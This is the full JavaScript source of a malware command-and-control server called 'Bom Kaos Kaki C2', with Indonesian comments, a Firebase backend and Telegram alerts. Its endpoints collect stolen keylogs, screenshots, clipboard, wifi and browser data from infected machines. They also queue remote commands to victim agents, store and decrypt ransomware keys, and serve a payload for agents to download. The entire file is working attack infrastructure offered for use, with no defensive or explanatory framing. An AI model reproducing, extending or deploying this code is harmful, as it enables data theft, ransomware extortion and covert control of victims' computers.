const express = require('express');
const admin = require('firebase-admin');
const Busboy = require('busboy');
const crypto = require('crypto');

// ============ FIREBASE INIT ============
let serviceAccount;
if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
} else {
    serviceAccount = require('../firebase/serviceAccount.json');
}
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
app.use(express.json({ limit: '100mb' }));
const router = express.Router();

// ============ UTILITY ============
function parseMultipart(req) {
    return new Promise((resolve, reject) => {
        const bb = Busboy({ headers: req.headers });
        const fields = {};
        let fileBuffer = null;
        let filename = '';
        bb.on('file', (fieldname, file, info) => {
            filename = info.filename;
            const chunks = [];
            file.on('data', d => chunks.push(d));
            file.on('end', () => { fileBuffer = Buffer.concat(chunks); });
        });
        bb.on('field', (fieldname, val) => { fields[fieldname] = val; });
        bb.on('finish', () => resolve({ fields, fileBuffer, filename }));
        bb.on('error', reject);
        req.pipe(bb);
    });
}

function formatFBTS(ts) {
    if (!ts) return null;
    if (ts._seconds) return new Date(ts._seconds * 1000).toISOString();
    if (ts instanceof Date) return ts.toISOString();
    return ts;
}

function safeString(str, maxLen = 5000) {
    if (!str) return '';
    return String(str).substring(0, maxLen);
}

// ============ SEND COMMAND TO TELEGRAM NOTIF ============
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

async function sendTelegramNotif(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    try {
        const https = require('https');
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return new Promise((resolve, reject) => {
            const u = new URL(url);
            const opts = {
                hostname: u.hostname, path: u.pathname, method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
            };
            const req = https.request(opts, res => { resolve(true); });
            req.on('error', () => resolve(false));
            req.write(payload);
            req.end();
        });
    } catch (_) { }
}

// ============ EXFIL ENDPOINT ============
router.post('/exfil', async (req, res) => {
    try {
        const contentType = req.headers['content-type'] || '';

        if (contentType.includes('multipart/form-data')) {
            const { fields, fileBuffer, filename } = await parseMultipart(req);
            const sessionId = fields.session_id || fields.sessionId || 'unknown';
            const type = fields.type || 'unknown';

            const docData = {
                sessionId, type,
                filename: filename || `${type}_${Date.now()}.bin`,
                data: fileBuffer ? fileBuffer.toString('base64') : null,
                timestamp: admin.firestore.FieldValue.serverTimestamp(),
                metadata: fields
            };

            const docRef = await db.collection('exfil').add(docData);

            await db.collection('agents').doc(sessionId).set({
                sessionId, lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
                lastExfilType: type, lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
            }, { merge: true });

            res.json({ success: true, id: docRef.id });
            return;
        }

        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const sessionId = data.session_id || data.sessionId || 'unknown';
        const type = data.type || 'unknown';

        // Jika ransomware_key, simpan di agent doc
        if (type === 'ransomware_key' && data.data && data.data.encrypted_key) {
            await db.collection('agents').doc(sessionId).set({
                ransomwareEncryptedKey: data.data.encrypted_key,
                ransomwareTime: admin.firestore.FieldValue.serverTimestamp()
            }, { merge: true });
        }

        const docData = {
            sessionId, type, data: data.data || data,
            timestamp: admin.firestore.FieldValue.serverTimestamp()
        };
        const docRef = await db.collection('exfil').add(docData);

        await db.collection('agents').doc(sessionId).set({
            sessionId, lastHeartbeat: admin.firestore.FieldValue.serverTimestamp()
        }, { merge: true });

        res.json({ success: true, id: docRef.id });
    } catch (err) {
        console.error('Exfil error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ HEARTBEAT ============
router.post('/heartbeat', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { session_id, hostname, username, os_info, ip, is_admin, process_id, modules } = data;

        const agentData = {
            sessionId: session_id,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            os: os_info || data.os || 'unknown',
            ip: ip || data.internal_ip || 'unknown',
            isAdmin: is_admin || false,

            processId: process_id || null,
            modules: modules || [],
            lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
            status: 'active'
        };

        const existing = await db.collection('agents').doc(session_id).get();
        if (!existing.exists) {
            agentData.firstSeen = admin.firestore.FieldValue.serverTimestamp();
        }

        await db.collection('agents').doc(session_id).set(agentData, { merge: true });

        res.json({
            success: true,
            next_poll: 15,
            server_time: new Date().toISOString(),
            commands_available: 0
        });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ GET COMMANDS ============
router.get('/get_commands', async (req, res) => {
    try {
        const sessionId = req.query.session_id;
        if (!sessionId) {
            return res.status(400).json({ success: false, error: 'session_id required' });
        }

        const now = new Date().toISOString();
        const snapshot = await db.collection('commands')
            .where('target_session', 'in', [sessionId, 'all'])
            .where('status', '==', 'pending')
            .get();

        const commands = [];
        snapshot.forEach(doc => {
            const data = doc.data();
            const sched = data.scheduled_time ? data.scheduled_time : now;
            if (sched <= now || !data.scheduled_time) {
                commands.push({ id: doc.id, command_type: data.command_type, parameters: data.parameters || {} });
            }
        });

        commands.sort((a, b) => {
            const ta = a.parameters?.priority || 0;
            const tb = b.parameters?.priority || 0;
            return tb - ta;
        });

        const limited = commands.slice(0, 10);

        res.json({ success: true, commands: limited, count: limited.length });
    } catch (err) {
        console.error('Get commands error:', err);
        res.json({ success: false, commands: [], count: 0, error: err.message });
    }
});

// ============ SEND COMMAND (from Dashboard) ============
router.post('/send_command', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { target_session, command_type, parameters, scheduled_time } = data;

        if (!target_session || !command_type) {
            return res.status(400).json({ success: false, error: 'Missing target_session or command_type' });
        }

        const commandDoc = {
            target_session,
            command_type,
            parameters: parameters || {},
            status: 'pending',
            created_at: admin.firestore.FieldValue.serverTimestamp(),
            scheduled_time: scheduled_time || new Date().toISOString(),
            created_by: data.created_by || 'dashboard'
        };

        const docRef = await db.collection('commands').add(commandDoc);

        // Notif Telegram
        const agentDoc = await db.collection('agents').doc(target_session).get();
        const agentName = agentDoc.exists ? agentDoc.data().hostname : target_session;
        sendTelegramNotif(
            `🎯 <b>Command Sent</b>\nTarget: ${agentName}\nType: ${command_type}\nID: ${docRef.id}`
        );

        res.json({ success: true, command_id: docRef.id });
    } catch (err) {
        console.error('Send command error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ COMMAND COMPLETE ============
router.post('/command_complete', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { command_id, status, result, error, session_id, command_type } = data;

        if (!command_id) {
            return res.status(400).json({ success: false, error: 'command_id required' });
        }

        await db.collection('commands').doc(command_id).update({
            status: status || 'completed',
            completed_at: admin.firestore.FieldValue.serverTimestamp(),
            result: safeString(result || ''),
            error: safeString(error || ''),
            completed_by: session_id || 'unknown'
        });

        await db.collection('exfil').add({
            sessionId: session_id || 'unknown',
            type: 'command_result',
            command_id,
            command_type: command_type || 'unknown',
            status: status || 'completed',
            result: safeString(result || ''),
            error: safeString(error || ''),
            timestamp: admin.firestore.FieldValue.serverTimestamp()
        });

        res.json({ success: true });
    } catch (err) {
        console.error('Command complete error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ AGENTS ============
router.get('/agents', async (req, res) => {
    try {
        const snapshot = await db.collection('agents')
            .orderBy('lastHeartbeat', 'desc')
            .get();

        const agents = [];
        snapshot.forEach(doc => {
            agents.push({ id: doc.id, ...doc.data() });
        });

        res.json({ success: true, agents });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

router.delete('/agents/:id', async (req, res) => {
    try {
        const agentId = req.params.id;
        await db.collection('agents').doc(agentId).delete();

        // Hapus juga data exfil terkait
        const exfilSnap = await db.collection('exfil')
            .where('sessionId', '==', agentId)
            .get();

        const batch = db.batch();
        exfilSnap.forEach(doc => batch.delete(doc.ref));
        await batch.commit();

        // Hapus pending commands
        const cmdSnap = await db.collection('commands')
            .where('target_session', '==', agentId)
            .where('status', '==', 'pending')
            .get();

        const cmdBatch = db.batch();
        cmdSnap.forEach(doc => cmdBatch.delete(doc.ref));
        await cmdBatch.commit();

        sendTelegramNotif(`🗑️ <b>Agent Deleted</b>\nSession: ${agentId.substring(0, 8)}...`);

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ EXFIL DATA ============
router.get('/exfil_data', async (req, res) => {
    try {
        const sessionId = req.query.session_id || null;
        const type = req.query.type || null;
        const limit = parseInt(req.query.limit) || 200;

        let query = db.collection('exfil').orderBy('timestamp', 'desc').limit(limit);
        const snapshot = await query.get();

        const items = [];
        snapshot.forEach(doc => {
            const data = doc.data();
            let match = true;

            if (sessionId && data.sessionId !== sessionId) match = false;
            if (type && type !== 'all' && data.type !== type) match = false;

            if (match) {
                items.push({ id: doc.id, ...data });
            }
        });

        res.json({ success: true, data: items, count: items.length });
    } catch (err) {
        console.error('Exfil data error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ DECRYPT SESSION ============
router.post('/decrypt_session', async (req, res) => {
    try {
        const { session_id, private_key } = req.body;
        if (!session_id || !private_key) {
            return res.status(400).json({ success: false, error: 'Missing session_id or private_key' });
        }

        const agentDoc = await db.collection('agents').doc(session_id).get();
        if (!agentDoc.exists) {
            return res.status(404).json({ success: false, error: 'Session not found' });
        }

        const encryptedKeyBase64 = agentDoc.data().ransomwareEncryptedKey;
        if (!encryptedKeyBase64) {
            return res.status(404).json({ success: false, error: 'No ransomware key for this session' });
        }

        let pemKey = private_key;
        if (!private_key.includes('-----BEGIN')) {
            pemKey = `-----BEGIN PRIVATE KEY-----\n${private_key}\n-----END PRIVATE KEY-----`;
        }

        const encryptedBuffer = Buffer.from(encryptedKeyBase64, 'base64');
        let decryptedKey;
        try {
            decryptedKey = crypto.privateDecrypt(
                { key: pemKey, padding: crypto.constants.RSA_PKCS1_PADDING },
                encryptedBuffer
            ).toString('utf8');
        } catch (_) {
            try {
                decryptedKey = crypto.privateDecrypt(
                    { key: pemKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
                    encryptedBuffer
                ).toString('utf8');
            } catch (__) {
                return res.status(400).json({ success: false, error: 'Failed to decrypt with provided key. Check private key format.' });
            }
        }

        const commandRef = await db.collection('commands').add({
            target_session: session_id,
            command_type: 'decrypt',
            parameters: { key: decryptedKey },
            status: 'pending',
            scheduled_time: new Date().toISOString(),
            created_at: admin.firestore.FieldValue.serverTimestamp(),
            created_by: 'dashboard'
        });

        const agentName = agentDoc.data().hostname || session_id;
        sendTelegramNotif(
            `🔓 <b>Decrypt Command Sent</b>\nTarget: ${agentName}\nKey length: ${decryptedKey.length} chars`
        );

        res.json({
            success: true,
            command_id: commandRef.id,
            message: 'Decrypt command sent to agent. Agent will restore files on next poll.',
            decrypted_key_preview: decryptedKey.substring(0, 20) + '...'
        });
    } catch (err) {
        console.error('Decrypt error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ DASHBOARD DATA ============
router.get('/dashboard_data', async (req, res) => {
    try {
        const sessionId = req.query.session_id || null;

        // Agents
        let agentsQuery = db.collection('agents').orderBy('lastHeartbeat', 'desc');
        const agentsSnap = await agentsQuery.get();
        const sessions = [];
        agentsSnap.forEach(d => sessions.push({ id: d.id, ...d.data() }));

        // Exfil summary
        let exfilQuery = db.collection('exfil').orderBy('timestamp', 'desc').limit(2000);
        const exfilSnap = await exfilQuery.get();

        const grouped = {
            screenshot: [], clipboard: [], keylog: [], keylogger: [],
            wifi: [], browser: [], phishing: [], system_info: [],
            spyware_connections: [], spyware_processes: [],
            command_result: [], ransomware: [], persistence: [],
            clean: [], destroy_bios: [], uninstall: [], heartbeat: []
        };

        exfilSnap.forEach(doc => {
            const item = { id: doc.id, ...doc.data() };
            const t = item.type || 'unknown';
            if (sessionId && item.sessionId !== sessionId) return;

            if (grouped[t]) {
                grouped[t].push(item);
            } else if (t.startsWith('spyware')) {
                grouped['spyware_connections'].push(item);
            } else {
                grouped['command_result'].push(item);
            }
        });

        // Commands summary
        const cmdSnap = await db.collection('commands')
            .orderBy('created_at', 'desc')
            .limit(100)
            .get();

        const commands = [];
        cmdSnap.forEach(doc => {
            const data = doc.data();
            if (!sessionId || data.target_session === sessionId) {
                commands.push({ id: doc.id, ...data });
            }
        });

        // Stats
        const stats = {
            total_sessions: sessions.length,
            active_sessions: sessions.filter(s => {
                const hb = s.lastHeartbeat;
                if (!hb || !hb._seconds) return false;
                return (Date.now() / 1000) - hb._seconds < 120;
            }).length,
            total_screenshots: grouped.screenshot.length,
            total_keylogs: grouped.keylog.length + grouped.keylogger.length,
            total_wifi: grouped.wifi.length,
            total_browser: grouped.browser.length,
            total_ransomware: grouped.ransomware.length,
            total_phishing: grouped.phishing.length
        };

        res.json({ success: true, sessions, stats, commands, ...grouped });
    } catch (err) {
        console.error('Dashboard data error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ WEBHOOK FOR TELEGRAM CALLBACK ============
router.post('/telegram_webhook', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        if (data.message && data.message.text) {
            const text = data.message.text.toLowerCase().trim();
            const chatId = data.message.chat.id;

            if (text === '/status') {
                const agentsSnap = await db.collection('agents')
                    .orderBy('lastHeartbeat', 'desc')
                    .limit(5)
                    .get();

                let msg = '🤖 <b>Bom Kaos Kaki C2 Status</b>\n\n';
                let count = 0;
                agentsSnap.forEach(doc => {
                    const a = doc.data();
                    count++;
                    const lastHb = a.lastHeartbeat?._seconds
                        ? Math.floor((Date.now() / 1000) - a.lastHeartbeat._seconds) + 's ago'
                        : 'N/A';
                    msg += `🖥️ ${a.hostname || 'Unknown'} (${a.ip || '?'})\n`;
                    msg += `   Session: ${doc.id.substring(0, 8)}...\n`;
                    msg += `   Last HB: ${lastHb}\n\n`;
                });

                if (count === 0) msg += 'No active agents.';

                const https = require('https');
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const payload = JSON.stringify({
                    chat_id: chatId, text: msg, parse_mode: 'HTML'
                });

                const u = new URL(url);
                const opts = {
                    hostname: u.hostname, path: u.pathname, method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
                };
                const reqTele = https.request(opts, () => { });
                reqTele.on('error', () => { });
                reqTele.write(payload);
                reqTele.end();
            }
        }
        res.json({ success: true });
    } catch (_) {
        res.json({ success: true });
    }
});

// ============ UPLOAD PAYLOAD FOR AGENT DOWNLOAD ============
router.get('/payload', async (req, res) => {
    try {
        const doc = await db.collection('config').doc('payload').get();
        if (doc.exists && doc.data().content) {
            res.setHeader('Content-Type', 'text/plain; charset=utf-8');
            res.send(doc.data().content);
        } else {
            res.status(404).json({ error: 'Payload not configured. Upload via dashboard.' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

router.post('/payload', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        if (!data.content) {
            return res.status(400).json({ success: false, error: 'No content provided' });
        }
        await db.collection('config').doc('payload').set({
            content: data.content,
            updated_at: admin.firestore.FieldValue.serverTimestamp(),
            version: data.version || '1.0'
        });
        res.json({ success: true, message: 'Payload updated' });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ HEALTH CHECK ============
router.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        version: '3.0.0',
        name: 'Bom Kaos Kaki C2'
    });
});

app.use('/api', router);
module.exports = app;